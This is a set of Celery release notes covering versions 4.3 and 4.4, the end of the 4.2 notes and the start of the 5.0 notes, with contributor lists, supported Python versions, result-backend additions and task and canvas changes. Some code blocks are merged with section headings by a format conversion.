\<<runeh@vorkosigan>.(none)\> Russell Keith-Magee \<<russell@keith-magee.com>\> Ryan Guest \<<ryanguest@gmail.com>\> Ryan Hiebert \<<ryan@ryanhiebert.com>\> Ryan Kelly \<<rkelly@truveris.com>\> Ryan Luckie \<<rtluckie@gmail.com>\> Ryan Petrello \<<lists@ryanpetrello.com>\> Ryan P. Kelly \<<rpkelly@cpan.org>\> Ryan P Kilby \<<rpkilby@ncsu.edu>\> Salvatore Rinchiera \<<srinchiera@college.harvard.edu>\> Sam Cooke \<<sam@mixcloud.com>\> samjy \<<sam+git@samjy.com>\> Sammie S. Taunton \<<diemuzi@gmail.com>\> Samuel Dion-Girardeau \<<samueldg@users.noreply.github.com>\> Samuel Dion-Girardeau \<<samuel.diongirardeau@gmail.com>\> Samuel GIFFARD \<<samuel@giffard.co>\> Scott Cooper \<<scttcper@gmail.com>\> screeley \<<screeley@screeley-laptop>.(none)\> sdcooke \<<sam@mixcloud.com>\> Sean O'Connor \<<sean@seanoc.com>\> Sean Wang \<<seanw@patreon.com>\> Sebastian Kalinowski \<<sebastian@kalinowski.eu>\> Sébastien Fievet \<<zyegfryed@gmail.com>\> Seong Won Mun \<<longfinfunnel@gmail.com>\> Sergey Fursov \<<GeyseR85@gmail.com>\> Sergey Tikhonov \<<zimbler@gmail.com>\> Sergi Almacellas Abellana \<<sergi@koolpi.com>\> Sergio Fernandez \<<ElAutoestopista@users.noreply.github.com>\> Seungha Kim \<<seungha.dev@gmail.com>\> shalev67 \<<shalev67@gmail.com>\> Shitikanth \<<golu3990@gmail.com>\> Silas Sewell \<<silas@sewell.org>\> Simon Charette \<<charette.s@gmail.com>\> Simon Engledew \<<simon@engledew.com>\> Simon Josi \<<simon.josi@atizo.com>\> Simon Legner \<<Simon.Legner@gmail.com>\> Simon Peeters \<<peeters.simon@gmail.com>\> Simon Schmidt \<<schmidt.simon@gmail.com>\> skovorodkin \<<sergey@skovorodkin.com>\> Slam \<<3lnc.slam@gmail.com>\> Smirl \<<smirlie@googlemail.com>\> squfrans \<<frans@squla.com>\> Srinivas Garlapati \<<srinivasa.b.garlapati@gmail.com>\> Stas Rudakou \<<stas@garage22.net>\> Static \<<staticfox@staticfox.net>\> Steeve Morin \<<steeve.morin@gmail.com>\> Stefan hr Berder \<<stefan.berder@ledapei.com>\> Stefan Kjartansson \<<esteban.supreme@gmail.com>\> Steffen Allner \<<sa@gocept.com>\> Stephen Weber \<<mordel@gmail.com>\> Steven Johns \<<duoi@users.noreply.github.com>\> Steven Parker \<<voodoonofx@gmail.com>\> Steven \<<rh0dium@users.noreply.github.com>\> Steven Sklar \<<steve@predata.com>\> Steven Skoczen \<<steven@aquameta.com>\> Steven Skoczen \<<steven@quantumimagery.com>\> Steve Peak \<<steve@stevepeak.net>\> stipa \<<stipa@debian.local.local>\> sukrit007 \<<sukrit007@gmail.com>\> Sukrit Khera \<<sukrit007@gmail.com>\> Sundar Raman \<<cybertoast@gmail.com>\> sunfinite \<<sunfinite@gmail.com>\> sww \<<sww@users.noreply.github.com>\> Tadej Janež \<<tadej.janez@tadej.hicsalta.si>\> Taha Jahangir \<<mtjahangir@gmail.com>\> Takeshi Kanemoto \<<tak.kanemoto@gmail.com>\> TakesxiSximada \<<takesxi.sximada@gmail.com>\> Tamer Sherif \<<tamer.sherif@flyingelephantlab.com>\> Tao Qingyun \<<845767657@qq.com>\> Tarun Bhardwaj \<<mailme@tarunbhardwaj.com>\> Tayfun Sen \<<tayfun.sen@markafoni.com>\> Tayfun Sen \<<tayfun.sen@skyscanner.net>\> Tayfun Sen \<<totayfun@gmail.com>\> tayfun \<<tayfun.sen@markafoni.com>\> Taylor C. Richberger \<<taywee@gmx.com>\> taylornelson \<<taylor@sourcedna.com>\> Theodore Dubois \<<tbodt@users.noreply.github.com>\> Theo Spears \<<github@theos.me.uk>\> Thierry RAMORASOAVINA \<<thierry.ramorasoavina@orange.com>\> Thijs Triemstra \<<info@collab.nl>\> Thomas French \<<thomas@sandtable.com>\> Thomas Grainger \<<tagrain@gmail.com>\> Thomas Johansson \<<prencher@prencher.dk>\> Thomas Meson \<<zllak@hycik.org>\> Thomas Minor \<<sxeraverx@gmail.com>\> Thomas Wright \<<tom.tdw@gmail.com>\> Timo Sugliani \<<timo.sugliani@gmail.com>\> Timo Sugliani \<<tsugliani@tsugliani-desktop>.(none)\> Titusz \<<tp@py7.de>\> tnir \<<tnir@users.noreply.github.com>\> Tobias Kunze \<<rixx@cutebit.de>\> Tocho Tochev \<<tocho@tochev.net>\> Tomas Machalek \<<tomas.machalek@gmail.com>\> Tomasz Święcicki \<<tomislater@gmail.com>\> Tom 'Biwaa' Riat \<<riat.tom@gmail.com>\> Tomek Święcicki \<<tomislater@gmail.com>\> Tom S \<<scytale@gmail.com>\> tothegump \<<tothegump@gmail.com>\> Travis Swicegood \<<development@domain51.com>\> Travis Swicegood \<<travis@domain51.com>\> Travis \<<treeder@gmail.com>\> Trevor Skaggs \<<skaggs.trevor@gmail.com>\> Ujjwal Ojha \<<ojhaujjwal@users.noreply.github.com>\> unknown \<Jonatan@.(none)\> Valentyn Klindukh \<<vklindukh@cogniance.com>\> Viktor Holmqvist \<<viktorholmqvist@gmail.com>\> Vincent Barbaresi \<<vbarbaresi@users.noreply.github.com>\> Vincent Driessen \<<vincent@datafox.nl>\> Vinod Chandru \<<vinod.chandru@gmail.com>\> Viraj \<<vnavkal0@gmail.com>\> Vitaly Babiy \<<vbabiy86@gmail.com>\> Vitaly \<<olevinsky.v.s@gmail.com>\> Vivek Anand \<<vivekanand1101@users.noreply.github.com>\> Vlad \<<frolvlad@gmail.com>\> Vladimir Gorbunov \<<vsg@suburban.me>\> Vladimir Kryachko \<<v.kryachko@gmail.com>\> Vladimir Rutsky \<<iamironbob@gmail.com>\> Vladislav Stepanov \<<8uk.8ak@gmail.com>\> Vsevolod \<<Vsevolod@zojax.com>\> Wes Turner \<<wes.turner@gmail.com>\> wes \<<wes@policystat.com>\> Wes Winham \<<winhamwr@gmail.com>\> w- \<<github@wangsanata.com>\> whendrik \<<whendrik@gmail.com>\> Wido den Hollander \<<wido@widodh.nl>\> Wieland Hoffmann \<<mineo@users.noreply.github.com>\> Wiliam Souza \<<wiliamsouza83@gmail.com>\> Wil Langford \<<wil.langford+github@gmail.com>\> William King \<<willtrking@gmail.com>\> Will \<<paradox41@users.noreply.github.com>\> Will Thompson \<<will@willthompson.co.uk>\> winhamwr \<<winhamwr@gmail.com>\> Wojciech Żywno \<<w.zywno@gmail.com>\> W. Trevor King \<<wking@tremily.us>\> wyc \<<wayne@neverfear.org>\> wyc \<<wyc@fastmail.fm>\> xando \<<sebastian.pawlus@gmail.com>\> Xavier Damman \<<xdamman@gmail.com>\> Xavier Hardy \<<xavierhardy@users.noreply.github.com>\> Xavier Ordoquy \<<xordoquy@linovia.com>\> xin li \<<xin.shli@ele.me>\> xray7224 \<<xray7224@googlemail.com>\> y0ngdi \<<36658095+y0ngdi@users.noreply.github.com>\> Yan Kalchevskiy \<<yan.kalchevskiy@gmail.com>\> Yohann Rebattu \<<yohann@rebattu.fr>\> Yoichi NAKAYAMA \<<yoichi.nakayama@gmail.com>\> Yuhannaa \<<yuhannaa@gmail.com>\> YuLun Shih \<<shih@yulun.me>\> Yury V. Zaytsev \<<yury@shurup.com>\> Yuval Greenfield \<<ubershmekel@gmail.com>\> Zach Smith \<<zmsmith27@gmail.com>\> Zhang Chi \<<clvrobj@gmail.com>\> Zhaorong Ma \<<mazhaorong@gmail.com>\> Zoran Pavlovic \<<xcepticzoki@gmail.com>\> ztlpn \<<mvzp10@gmail.com>\> 何翔宇(Sean Ho) \<<h1x2y3awalm@gmail.com>\> 許邱翔 \<<wdv4758h@gmail.com>\>

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Important Notes

### Supported Python Versions

The supported Python Versions are:

  - CPython 2.7
  - CPython 3.4
  - CPython 3.5
  - CPython 3.6
  - PyPy 5.8 (`pypy2`)

## News

### Result Backends

#### New Redis Sentinel Results Backend

Redis Sentinel provides high availability for Redis. A new result backend supporting it was added.

#### Cassandra Results Backend

A new <span class="title-ref">cassandra\_options</span> configuration option was introduced in order to configure the cassandra client.

See \[conf-cassandra-result-backend\](\#conf-cassandra-result-backend) for more information.

#### DynamoDB Results Backend

A new <span class="title-ref">dynamodb\_endpoint\_url</span> configuration option was introduced in order to point the result backend to a local endpoint during development or testing.

See \[conf-dynamodb-result-backend\](\#conf-dynamodb-result-backend) for more information.

#### Python 2/3 Compatibility Fixes

Both the CouchDB and the Consul result backends accepted byte strings without decoding them to Unicode first. This is now no longer the case.

### Canvas

Multiple bugs were resolved resulting in a much smoother experience when using Canvas.

### Tasks

#### Bound Tasks as Error Callbacks

We fixed a regression that occurred when bound tasks are used as error callbacks. This used to work in Celery 3.x but raised an exception in 4.x until this release.

In both 4.0 and 4.1 the following code wouldn't work:

`` `python   @app.task(name="raise_exception", bind=True)   def raise_exception(self):       raise Exception("Bad things happened")     @app.task(name="handle_task_exception", bind=True)   def handle_task_exception(self):       print("Exception detected")    subtask = raise_exception.subtask()    subtask.apply_async(link_error=handle_task_exception.s())  Task Representation ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

  - Shadowing task names now works as expected. The shadowed name is properly presented in flower, the logs and the traces.
  - <span class="title-ref">argsrepr</span> and <span class="title-ref">kwargsrepr</span> were previously not used even if specified. They now work as expected. See \[task-hiding-sensitive-information\](\#task-hiding-sensitive-information) for more information.

#### Custom Requests

We now allow tasks to use custom `request <celery.worker.request.Request>` classes for custom task classes.

See \[task-requests-and-custom-requests\](\#task-requests-and-custom-requests) for more information.

#### Retries with Exponential Backoff

Retries can now be performed with exponential backoffs to avoid overwhelming external services with requests.

See \[task-autoretry\](\#task-autoretry) for more information.

### Sphinx Extension

Tasks were supposed to be automatically documented when using Sphinx's Autodoc was used. The code that would have allowed automatic documentation had a few bugs which are now fixed.

Also, The extension is now documented properly. See \[sphinx\](\#sphinx) for more information.

---

whatsnew-4.3.md

---

# What's new in Celery 4.3 (rhubarb)

  - Author  
    Omer Katz (`omer.drow at gmail.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.7, 3.4, 3.5, 3.6 & 3.7 and is also supported on PyPy2 & PyPy3.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 4.3.0 release continues to improve our efforts to provide you with the best task execution platform for Python.

This release has been codenamed [Rhubarb](https://www.youtube.com/watch?v=_AWIqXzvX-U) which is one of my favorite tracks from Selected Ambient Works II.

This release focuses on new features like new result backends and a revamped security serializer along with bug fixes mainly for Celery Beat, Canvas, a number of critical fixes for hanging workers and fixes for several severe memory leaks.

Celery 4.3 is the first release to support Python 3.7.

We hope that 4.3 will be the last release to support Python 2.7 as we now begin to work on Celery 5, the next generation of our task execution platform.

However, if Celery 5 will be delayed for any reason we may release another 4.x minor version which will still support Python 2.7.

If another 4.x version will be released it will most likely drop support for Python 3.4 as it will reach it's EOL in March 2019.

We have also focused on reducing contribution friction.

Thanks to **Josue Balandrano Coronel**, one of our core contributors, we now have an updated \[contributing\](\#contributing) document. If you intend to contribute, please review it at your earliest convenience.

I have also added new issue templates, which we will continue to improve, so that the issues you open will have more relevant information which will allow us to help you to resolve them more easily.

*— Omer Katz*

### Wall of Contributors

Alexander Ioannidis \<<a.ioannidis.pan@gmail.com>\> Amir Hossein Saeid Mehr \<<amir.saiedmehr@gmail.com>\> Andrea Rabbaglietti \<<rabbagliettiandrea@gmail.com>\> Andrey Skabelin \<<andrey.skabelin@gmail.com>\> Anthony Ruhier \<<anthony.ruhier@gmail.com>\> Antonin Delpeuch \<<antonin@delpeuch.eu>\> Artem Vasilyev \<<artem.v.vasilyev@gmail.com>\> Asif Saif Uddin (Auvi) \<<auvipy@gmail.com>\> aviadatsnyk \<<aviad@snyk.io>\> Axel Haustant \<<noirbizarre@users.noreply.github.com>\> Benjamin Pereto \<<github@sandchaschte.ch>\> Bojan Jovanovic \<<bojan.jovanovic.gtech@gmail.com>\> Brett Jackson \<<brett@brettjackson.org>\> Brett Randall \<<javabrett@gmail.com>\> Brian Schrader \<<brian@brianschrader.com>\> Bruno Alla \<<browniebroke@users.noreply.github.com>\> Buddy \<<34044521+CoffeeExpress@users.noreply.github.com>\> Charles Chan \<<charleswhchan@users.noreply.github.com>\> Christopher Dignam \<<chris@dignam.xyz>\> Ciaran Courtney \<<6096029+ciarancourtney@users.noreply.github.com>\> Clemens Wolff \<<clemens@justamouse.com>\> Colin Watson \<<cjwatson@ubuntu.com>\> Daniel Hahler \<<github@thequod.de>\> Dash Winterson \<<dashdanw@gmail.com>\> Derek Harland \<<donkopotamus@users.noreply.github.com>\> Dilip Vamsi Moturi \<<16288600+dilipvamsi@users.noreply.github.com>\> Dmytro Litvinov \<<litvinov.dmytro.it@gmail.com>\> Douglas Rohde \<<douglas.rohde2@gmail.com>\> Ed Morley \<<501702+edmorley@users.noreply.github.com>\> Fabian Becker \<<halfdan@xnorfz.de>\> Federico Bond \<<federicobond@gmail.com>\> Fengyuan Chen \<<cfy1990@gmail.com>\> Florian CHARDIN \<<othalla.lf@gmail.com>\> George Psarakis \<<giwrgos.psarakis@gmail.com>\> Guilherme Caminha \<<gpkc@cin.ufpe.br>\> ideascf \<<ideascf@163.com>\> Itay \<<itay.bittan@gmail.com>\> Jamie Alessio \<<jamie@stoic.net>\> Jason Held \<<jasonsheld@gmail.com>\> Jeremy Cohen \<<jcohen02@users.noreply.github.com>\> John Arnold \<<johnar@microsoft.com>\> Jon Banafato \<<jonathan.banafato@gmail.com>\> Jon Dufresne \<<jon.dufresne@gmail.com>\> Joshua Engelman \<<j.aaron.engelman@gmail.com>\> Joshua Schmid \<<jschmid@suse.com>\> Josue Balandrano Coronel \<<xirdneh@gmail.com>\> K Davis \<<anybodys@users.noreply.github.com>\> kidoz \<<ckidoz@gmail.com>\> Kiyohiro Yamaguchi \<<kiyoya@gmail.com>\> Korijn van Golen \<<korijn@gmail.com>\> Lars Kruse \<<devel@sumpfralle.de>\> Lars Rinn \<<lm.rinn@outlook.com>\> Lewis M. Kabui \<<lewis.maina@andela.com>\> madprogrammer \<<serg@anufrienko.net>\> Manuel Vázquez Acosta \<<mvaled@users.noreply.github.com>\> Marcus McHale \<<marcus.mchale@nuigalway.ie>\> Mariatta \<<Mariatta@users.noreply.github.com>\> Mario Kostelac \<<mario@intercom.io>\> Matt Wiens \<<mwiens91@gmail.com>\> Maximilien Cuony \<<the-glu@users.noreply.github.com>\> Maximilien de Bayser \<<maxdebayser@gmail.com>\> Meysam \<<MeysamAzad81@yahoo.com>\> Milind Shakya \<<milin@users.noreply.github.com>\> na387 \<<na387@users.noreply.github.com>\> Nicholas Pilon \<<npilon@gmail.com>\> Nick Parsons \<<nparsons08@gmail.com>\> Nik Molnar \<<nik.molnar@consbio.org>\> Noah Hall \<<noah.t.hall@gmail.com>\> Noam \<<noamkush@users.noreply.github.com>\> Omer Katz \<<omer.drow@gmail.com>\> Paweł Adamczak \<<pawel.ad@gmail.com>\> peng weikang \<<pengwk2@gmail.com>\> Prathamesh Salunkhe \<<spratham55@gmail.com>\> Przemysław Suliga \<<1270737+suligap@users.noreply.github.com>\> Raf Geens \<<rafgeens@gmail.com>\> (◕ᴥ◕) \<<ratson@users.noreply.github.com>\> Robert Kopaczewski \<<rk@23doors.com>\> Samuel Huang \<<samhuang91@gmail.com>\> Sebastian Wojciechowski \<<42519683+sebwoj@users.noreply.github.com>\> Seunghun Lee \<<waydi1@gmail.com>\> Shanavas M \<<shanavas.m2@gmail.com>\> Simon Charette \<<charettes@users.noreply.github.com>\> Simon Schmidt \<<schmidt.simon@gmail.com>\> srafehi \<<shadyrafehi@gmail.com>\> Steven Sklar \<<sklarsa@gmail.com>\> Tom Booth \<<thomasbo@microsoft.com>\> Tom Clancy \<<ClancyTJD@users.noreply.github.com>\> Toni Ruža \<<gmr.gaf@gmail.com>\> tothegump \<<tothegump@gmail.com>\> Victor Mireyev \<<victor@opennodecloud.com>\> Vikas Prasad \<<vikasprasad.prasad@gmail.com>\> walterqian \<<walter@color.com>\> Willem \<<himself@willemthiart.com>\> Xiaodong \<<xd_deng@hotmail.com>\> yywing \<<386542536@qq.com>\>

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.2

Please read the important notes below as there are several breaking changes.

## Important Notes

### Supported Python Versions

The supported Python Versions are:

  - CPython 2.7
  - CPython 3.4
  - CPython 3.5
  - CPython 3.6
  - CPython 3.7
  - PyPy2.7 6.0 (`pypy2`)
  - PyPy3.5 6.0 (`pypy3`)

### Kombu

Starting from this release, the minimum required version is Kombu 4.4.

#### New Compression Algorithms

Kombu 4.3 includes a few new optional compression methods:

  - LZMA (available from stdlib if using Python 3 or from a backported package)
  - Brotli (available if you install either the brotli or the brotlipy package)
  - ZStandard (available if you install the zstandard package)

Unfortunately our current protocol generates huge payloads for complex canvases.

Until we migrate to our 3rd revision of the Celery protocol in Celery 5 which will resolve this issue, please use one of the new compression methods as a workaround.

See \[calling-compression\](\#calling-compression) for details.

### Billiard

Starting from this release, the minimum required version is Billiard 3.6.

### Eventlet Workers Pool

We now require <span class="title-ref">eventlet\>=0.24.1</span>.

If you are using the eventlet workers pool please install Celery using:

`` `console   $ pip install -U celery[eventlet]  MessagePack Serializer ``\` ----------------------

We've been using the deprecated <span class="title-ref">msgpack-python</span> package for a while. This is now fixed as we depend on the <span class="title-ref">msgpack</span> instead.

If you are currently using the MessagePack serializer please uninstall the previous package and reinstall the new one using:

`` `console   $ pip uninstall msgpack-python -y   $ pip install -U celery[msgpack]  MongoDB Result Backend ``\` -----------------------

We now support the [DNS seedlist connection format](https://docs.mongodb.com/manual/reference/connection-string/#dns-seedlist-connection-format) for the MongoDB result backend.

This requires the <span class="title-ref">dnspython</span> package.

If you are using the MongoDB result backend please install Celery using:

`` `console   $ pip install -U celery[mongodb]  Redis Message Broker ``\` --------------------

Due to multiple bugs in earlier versions of py-redis that were causing issues for Celery, we were forced to bump the minimum required version to 3.2.0.

### Redis Result Backend

Due to multiple bugs in earlier versions of py-redis that were causing issues for Celery, we were forced to bump the minimum required version to 3.2.0.

### Riak Result Backend

The official Riak client does not support Python 3.7 as of yet.

In case you are using the Riak result backend, either attempt to install the client from master or avoid upgrading to Python 3.7 until this matter is resolved.

In case you are using the Riak result backend with Python 3.7, we now emit a warning.

Please track [basho/riak-python-client\#534](https://github.com/basho/riak-python-client/issues/534) for updates.

### Dropped Support for RabbitMQ 2.x

Starting from this release, we officially no longer support RabbitMQ 2.x.

The last release of 2.x was in 2012 and we had to make adjustments to correctly support high availability on RabbitMQ 3.x.

If for some reason, you are still using RabbitMQ 2.x we encourage you to upgrade as soon as possible since security patches are no longer applied on RabbitMQ 2.x.

### Django Support

Starting from this release, the minimum required Django version is 1.11.

### Revamped auth Serializer

The auth serializer received a complete overhaul. It was previously horribly broken.

We now depend on <span class="title-ref">cryptography</span> instead of <span class="title-ref">pyOpenSSL</span> for this serializer.

See \[message-signing\](\#message-signing) for details.

## News

### Brokers

#### Redis Broker Support for SSL URIs

The Redis broker now has support for SSL connections.

You can use `broker_use_ssl` as you normally did and use a <span class="title-ref">rediss://</span> URI.

You can also pass the SSL configuration parameters to the URI:

> <span class="title-ref">rediss://localhost:3456?ssl\_keyfile=keyfile.key\&ssl\_certfile=certificate.crt\&ssl\_ca\_certs=ca.pem\&ssl\_cert\_reqs=CERT\_REQUIRED</span>

#### Configurable Events Exchange Name

Previously, the events exchange name was hardcoded.

You can use `event_exchange` to determine it. The default value remains the same.

#### Configurable Pidbox Exchange Name

Previously, the Pidbox exchange name was hardcoded.

You can use `control_exchange` to determine it. The default value remains the same.

### Result Backends

#### Redis Result Backend Support for SSL URIs

The Redis result backend now has support for SSL connections.

You can use `redis_backend_use_ssl` to configure it and use a <span class="title-ref">rediss://</span> URI.

You can also pass the SSL configuration parameters to the URI:

> <span class="title-ref">rediss://localhost:3456?ssl\_keyfile=keyfile.key\&ssl\_certfile=certificate.crt\&ssl\_ca\_certs=ca.pem\&ssl\_cert\_reqs=CERT\_REQUIRED</span>

#### Store Extended Task Metadata in Result

When `result_extended` is <span class="title-ref">True</span> the backend will store the following metadata:

  - Task Name
  - Arguments
  - Keyword arguments
  - The worker the task was executed on
  - Number of retries
  - The queue's name or routing key

In addition, <span class="title-ref">celery.app.task.update\_state</span> now accepts keyword arguments which allows you to store custom data with the result.

#### Encode Results Using A Different Serializer

The `result_accept_content` setting allows to configure different accepted content for the result backend.

A special serializer (<span class="title-ref">auth</span>) is used for signed messaging, however the result\_serializer remains in json, because we don't want encrypted content in our result backend.

To accept unsigned content from the result backend, we introduced this new configuration option to specify the accepted content from the backend.

#### New Result Backends

This release introduces four new result backends:

>   - S3 result backend
>   - ArangoDB result backend
>   - Azure Block Blob Storage result backend
>   - CosmosDB result backend

#### S3 Result Backend

Amazon Simple Storage Service (Amazon S3) is an object storage service by AWS.

The results are stored using the following path template:

\<`s3_bucket`\>/\<`s3_base_path`\>/\<key\>

See \[conf-s3-result-backend\](\#conf-s3-result-backend) for more information.

#### ArangoDB Result Backend

ArangoDB is a native multi-model database with search capabilities. The backend stores the result in the following document format:

 {  
   \_key: {key},  
   task: {task}  
 }

See \[conf-arangodb-result-backend\](\#conf-arangodb-result-backend) for more information.

#### Azure Block Blob Storage Result Backend

Azure Block Blob Storage is an object storage service by Microsoft.

The backend stores the result in the following path template:

\<`azureblockblob_container_name`\>/\<key\>

See \[conf-azureblockblob-result-backend\](\#conf-azureblockblob-result-backend) for more information.

#### CosmosDB Result Backend

Azure Cosmos DB is Microsoft's globally distributed, multi-model database service.

The backend stores the result in the following document format:

 {  
   id: {key},  
   value: {task}  
 }

See \[conf-cosmosdbsql-result-backend\](\#conf-cosmosdbsql-result-backend) for more information.

### Tasks

#### Cythonized Tasks

Cythonized tasks are now supported. You can generate C code from Cython that specifies a task using the <span class="title-ref">@task</span> decorator and everything should work exactly the same.

#### Acknowledging Tasks on Failures or Timeouts

When `task_acks_late` is set to <span class="title-ref">True</span> tasks are acknowledged on failures or timeouts. This makes it hard to use dead letter queues and exchanges.

Celery 4.3 introduces the new `task_acks_on_failure_or_timeout` which allows you to avoid acknowledging tasks if they failed or timed out even if `task_acks_late` is set to <span class="title-ref">True</span>.

`task_acks_on_failure_or_timeout` is set to <span class="title-ref">True</span> by default.

#### Schedules Now Support Microseconds

When scheduling tasks using `celery beat` microseconds are no longer ignored.

#### Default Task Priority

You can now set the default priority of a task using the `task_default_priority` setting. The setting's value will be used if no priority is provided for a specific task.

#### Tasks Optionally Inherit Parent's Priority

Setting the `task_inherit_parent_priority` configuration option to <span class="title-ref">True</span> will make Celery tasks inherit the priority of the previous task linked to it.

Examples:

`` `python   c = celery.chain(     add.s(2), # priority=None     add.s(3).set(priority=5), # priority=5     add.s(4), # priority=5     add.s(5).set(priority=3), # priority=3     add.s(6), # priority=3   )  .. code-block:: python    @app.task(bind=True)   def child_task(self):     pass    @app.task(bind=True)   def parent_task(self):     child_task.delay()    # child_task will also have priority=5   parent_task.apply_async(args=[], priority=5)  Canvas ``\` ------

#### Chords can be Executed in Eager Mode

When `task_always_eager` is set to <span class="title-ref">True</span>, chords are executed eagerly as well.

#### Configurable Chord Join Timeout

Previously, <span class="title-ref">celery.result.GroupResult.join</span> had a fixed timeout of 3 seconds.

The `result_chord_join_timeout` setting now allows you to change it.

The default remains 3 seconds.

---

whatsnew-4.4.md

---

# What's new in Celery 4.4 (Cliffs)

  - Author  
    Asif Saif Uddin (`auvipy at gmail.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

This version is officially supported on CPython 2.7, 3.5, 3.6, 3.7 & 3.8 and is also supported on PyPy2 & PyPy3.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Preface

The 4.4.0 release continues to improve our efforts to provide you with the best task execution platform for Python.

This release has been codenamed [Cliffs](https://www.youtube.com/watch?v=i524g6JMkwI) which is one of my favorite tracks.

This release focuses on mostly bug fixes and usability improvement for developers. Many long standing bugs, usability issues, documentation issues & minor enhancement issues were squashed which improve the overall developers experience.

Celery 4.4 is the first release to support Python 3.8 & pypy36-7.2.

As we now begin to work on Celery 5, the next generation of our task execution platform, at least another 4.x is expected before Celery 5 stable release & will get support for at least 1 years depending on community demand and support.

We have also focused on reducing contribution friction and updated the contributing tools.

*— Asif Saif Uddin*

### Wall of Contributors

\> **Note** \> This wall was automatically generated from git history, so sadly it doesn't not include the people who help with more important things like answering mailing-list questions.

## Upgrading from Celery 4.3

Please read the important notes below as there are several breaking changes.

## Important Notes

### Supported Python Versions

The supported Python Versions are:

  - CPython 2.7
  - CPython 3.5
  - CPython 3.6
  - CPython 3.7
  - CPython 3.8
  - PyPy2.7 7.2 (`pypy2`)
  - PyPy3.5 7.1 (`pypy3`)
  - PyPy3.6 7.2 (`pypy3`)

### Dropped support for Python 3.4

Celery now requires either Python 2.7 or Python 3.5 and above.

Python 3.4 has reached EOL in March 2019. In order to focus our efforts we have dropped support for Python 3.4 in this version.

If you still require to run Celery using Python 3.4 you can still use Celery 4.3. However we encourage you to upgrade to a supported Python version since no further security patches will be applied for Python 3.4.

### Kombu

Starting from this release, the minimum required version is Kombu 4.6.6.

### Billiard

Starting from this release, the minimum required version is Billiard 3.6.1.

### Redis Message Broker

Due to multiple bugs in earlier versions of redis-py that were causing issues for Celery, we were forced to bump the minimum required version to 3.3.0.

### Redis Result Backend

Due to multiple bugs in earlier versions of redis-py that were causing issues for Celery, we were forced to bump the minimum required version to 3.3.0.

### DynamoDB Result Backend

The DynamoDB result backend has gained TTL support. As a result the minimum boto3 version was bumped to 1.9.178 which is the first version to support TTL for DynamoDB.

### S3 Results Backend

To keep up with the current AWS API changes the minimum boto3 version was bumped to 1.9.125.

### SQS Message Broker

To keep up with the current AWS API changes the minimum boto3 version was bumped to 1.9.125.

### Configuration

<span class="title-ref">CELERY\_TASK\_RESULT\_EXPIRES</span> has been replaced with <span class="title-ref">CELERY\_RESULT\_EXPIRES</span>.

## News

### Task Pools

#### Threaded Tasks Pool

We reintroduced a threaded task pool using <span class="title-ref">concurrent.futures.ThreadPoolExecutor</span>.

The previous threaded task pool was experimental. In addition it was based on the [threadpool](https://pypi.org/project/threadpool/) package which is obsolete.

You can use the new threaded task pool by setting `worker_pool` to 'threads\` or by passing <span class="title-ref">--pool threads</span> to the <span class="title-ref">celery worker</span> command.

### Result Backends

#### ElasticSearch Results Backend

##### HTTP Basic Authentication Support

You can now use HTTP Basic Authentication when using the ElasticSearch result backend by providing the username and the password in the URI.

Previously, they were ignored and only unauthenticated requests were issued.

#### MongoDB Results Backend

##### Support for Authentication Source and Authentication Method

You can now specify the authSource and authMethod for the MongoDB using the URI options. The following URI does just that:

> `mongodb://user:password@example.com/?authSource=the_database&authMechanism=SCRAM-SHA-256`

Refer to the [documentation](https://api.mongodb.com/python/current/examples/authentication.html) for details about the various options.

### Tasks

#### Task class definitions can now have retry attributes

You can now use <span class="title-ref">autoretry\_for</span>, <span class="title-ref">retry\_kwargs</span>, <span class="title-ref">retry\_backoff</span>, <span class="title-ref">retry\_backoff\_max</span> and <span class="title-ref">retry\_jitter</span> in class-based tasks:

`` `python   class BaseTaskWithRetry(Task):     autoretry_for = (TypeError,)     retry_kwargs = {'max_retries': 5}     retry_backoff = True     retry_backoff_max = 700     retry_jitter = False   Canvas ``\` ------

#### Replacing Tasks Eagerly

You can now call <span class="title-ref">self.replace()</span> on tasks which are run eagerly. They will work exactly the same as tasks which are run asynchronously.

#### Chaining Groups

Chaining groups no longer result in a single group.

The following used to join the two groups into one. Now they correctly execute one after another:

    >>> result = group(add.si(1, 2), add.si(1, 2)) | group(tsum.s(), tsum.s()).delay()
    >>> result.get()
    [6, 6]

---

whatsnew-5.0.md

---

# What's new in Celery 5.0 (singularity)

  - Author  
    Omer Katz (`omer.drow at gmail.com`)

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

